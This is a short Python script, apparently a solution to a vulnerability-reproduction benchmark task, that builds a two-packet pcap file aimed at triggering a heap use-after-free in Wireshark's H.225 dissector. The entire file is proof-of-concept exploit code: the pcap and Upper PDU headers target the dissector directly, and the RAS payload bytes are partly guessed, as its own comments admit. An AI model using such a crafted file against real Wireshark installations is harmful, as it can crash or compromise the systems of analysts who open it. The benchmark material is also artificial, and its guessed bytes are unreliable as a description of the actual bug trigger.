import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free in h225 dissector.
        The vulnerability involves next_tvb_add_handle allocating in packet scope,
        and dissect_h225_h225_RasMessage reusing it in a subsequent packet without initialization.
        
        We use DLT_WIRESHARK_UPPER_PDU (252) to target the 'h225' dissector directly
        with minimal overhead, and provide two packets to trigger the UAF.
        """
        
        # PCAP Global Header
        # Magic: 0xa1b2c3d4 (Little Endian -> d4 c3 b2 a1)
        # Version: 2.4
        # Thiszone: 0, Sigfigs: 0, Snaplen: 65535
        # LinkType: 252 (DLT_WIRESHARK_UPPER_PDU)
        global_header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 252)

        # Upper PDU Header
        # Field 1: Tag 12 (Dissector Name), Length 4, Value "h225"
        # Field 2: Tag 0 (End of Options), Length 0
        # Tags and lengths are Big Endian in Upper PDU header
        upper_header = b'\x00\x0c\x00\x04h225\x00\x00\x00\x00'

        # H.225 RAS Payload (PER Aligned)
        # We target a RasMessage that includes a NonStandardParameter to trigger next_tvb_add_handle.
        # Byte 0: 0x00 -> RasMessage Choice 0 (GatekeeperRequest)
        # Byte 1: 0x80 -> Option Bitmap. Assuming MSB corresponds to nonStandardData or similar field.
        # Following bytes: Filler to satisfy mandatory fields (requestSeqNum, protocolIdentifier) 
        # and reach the optional field parsing.
        payload = b'\x00\x80\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'

        # Packet 1 construction
        pkt1_data = upper_header + payload
        pkt1_hdr = struct.pack('<IIII', 0, 0, len(pkt1_data), len(pkt1_data))
        
        # Packet 2 construction (Identical to Packet 1 to trigger UAF on re-entry)
        pkt2_data = upper_header + payload
        pkt2_hdr = struct.pack('<IIII', 0, 0, len(pkt2_data), len(pkt2_data))

        return global_header + pkt1_hdr + pkt1_data + pkt2_hdr + pkt2_data